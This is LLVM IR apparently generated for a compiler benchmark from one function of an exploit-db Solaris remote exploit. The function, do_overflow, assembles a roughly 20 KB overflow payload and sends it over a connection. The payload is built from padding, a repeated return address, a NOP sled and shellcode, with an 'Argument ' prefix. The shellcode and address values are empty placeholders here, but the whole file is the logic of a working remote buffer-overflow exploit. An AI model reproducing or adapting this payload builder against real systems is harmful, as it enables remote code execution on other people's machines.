; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_301.c_do_overflow.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_301.c_do_overflow.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@retaddr = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [10 x i8] c"Argument \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @do_overflow(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [20000 x i8], align 16
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 0, i32* %5, align 4
  %6 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 0
  %7 = call i32 @memset(i8* %6, i32 0, i32 20000)
  %8 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 0
  %9 = call i32 @memset(i8* %8, i32 66, i32 19782)
  store i32 0, i32* %5, align 4
  br label %10

10:                                               ; preds = %20, %1
  %11 = load i32, i32* %5, align 4
  %12 = icmp slt i32 %11, 19772
  br i1 %12, label %13, label %23

13:                                               ; preds = %10
  %14 = load i32, i32* @retaddr, align 4
  %15 = call i32 @htonl(i32 %14)
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 %17
  %19 = bitcast i8* %18 to i32*
  store i32 %15, i32* %19, align 1
  br label %20

20:                                               ; preds = %13
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 4
  store i32 %22, i32* %5, align 4
  br label %10

23:                                               ; preds = %10
  store i32 0, i32* %5, align 4
  br label %24

24:                                               ; preds = %34, %23
  %25 = load i32, i32* %5, align 4
  %26 = icmp slt i32 %25, 19600
  br i1 %26, label %27, label %37

27:                                               ; preds = %24
  %28 = load i32, i32* @NOP, align 4
  %29 = call i32 @htonl(i32 %28)
  %30 = load i32, i32* %5, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 %31
  %33 = bitcast i8* %32 to i32*
  store i32 %29, i32* %33, align 1
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %5, align 4
  %36 = add nsw i32 %35, 4
  store i32 %36, i32* %5, align 4
  br label %24

37:                                               ; preds = %24
  %38 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 0
  %39 = getelementptr inbounds i8, i8* %38, i64 19000
  %40 = load i8*, i8** @shellcode, align 8
  %41 = load i8*, i8** @shellcode, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = call i32 @memcpy(i8* %39, i8* %40, i32 %42)
  %44 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 0
  %45 = call i32 @strlen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %46 = call i32 @memcpy(i8* %44, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %45)
  %47 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 19781
  store i8 10, i8* %47, align 1
  %48 = getelementptr inbounds [20000 x i8], [20000 x i8]* %4, i64 0, i64 0
  %49 = load i32, i32* %3, align 4
  %50 = call i32 @zwrite(i8* %48, i32 19782, i32 %49)
  %51 = load i32, i32* %3, align 4
  %52 = call i32 @zflush(i32 %51)
  %53 = load i32, i32* %2, align 4
  ret i32 %53
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @zwrite(i8*, i32, i32) #1

declare dso_local i32 @zflush(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
